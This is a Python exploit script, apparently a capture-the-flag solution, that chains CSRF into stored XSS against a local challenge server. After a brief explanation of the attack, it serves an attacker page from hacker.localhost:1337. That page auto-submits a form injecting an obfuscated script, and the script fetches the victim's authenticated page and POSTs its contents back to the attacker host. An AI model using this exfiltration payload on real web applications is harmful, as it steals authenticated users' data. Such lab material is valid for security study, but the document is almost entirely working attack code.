import os
import re
import requests
import sys
import time
import urllib.parse
from flask import Flask, request


"""
Theory:
Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted
actions on a web application in which they’re currently authenticated.
CSRF does not change the website code itself, bug rather lets the user use the website
in a way the user did not intend to. I.e. we could set up a malicious server and send the
respective link via email to the user. Once the user clicks on the link while being authenticated
to the website we are actually targeting with our attack, we might force the user to send a request
to the target website by returning a redirect or form request from our malicious server.

Specific to this challenge:
CSRF can be used in combination with XSS. We force the user to make authenticated requests
against the target website, that inject a malicious script. We thereby let the user execute the
XSS attack for us.
"""

def challenge():
	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.")
	exit(1)

def attack():
	app = Flask(__name__)

	@app.route("/", methods=["GET"])
	def xss_via_csrf():
		print(f"Inject xss!")
		sys.stdout.flush()
		return '<html><body>' + \
			'<form name=pub action=http://challenge.localhost:80/ephemeral method="get">' + \
			'<input id="xss" type="hidden" name="msg"/>' + \
			'</form>' + \
			'<script>' + \
			'let xss = "<script";xss += ">";' + \
			'xss += "fetch(\'http://challenge.localhost:80/\').then((resp) => resp.text())' + \
			'.then((text) => {' + \
			'fetch(\'http://hacker.localhost:1337/\', {\'method\': \'POST\'' + \
			', \'body\': text});});";' + \
			'xss += "</script";xss += ">";' + \
			'document.getElementById("xss").value = xss;' + \
			'document.forms["pub"].submit();' + \
			'</script>' + \
			'</body></html>'

	@app.route("/", methods=["POST"])
	def show_flag():
		print(request.data)
		sys.stdout.flush()
		return ""

	app.run("hacker.localhost", 1337, use_reloader=False)
	exit(1)

pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
pat1 = re.compile(r".*Running on http://hacker.localhost:1337\n")
challenge_up = False
attacker_up = False
r1, w1 = os.pipe()

for proc in [challenge, attack]:
	pid = os.fork()

	if pid == -1:
		print("Error fork.")
		exit(1)

	if pid == 0:
		os.close(r1)

		os.dup2(w1, 1)
		os.close(w1)

		# stdout as stderr
		os.dup2(1, 2)

		proc()

os.close(w1)

read_file = os.fdopen(r1, "r")

while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		challenge_up = True

	m = pat1.match(line)
	if m:
		attacker_up = True

	if challenge_up and attacker_up:
		challenge_up = False
		attacker_up = False
		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			os.execv("/challenge/victim", ["/challenge/victim"])
			print("Error execv.")
			exit(1)
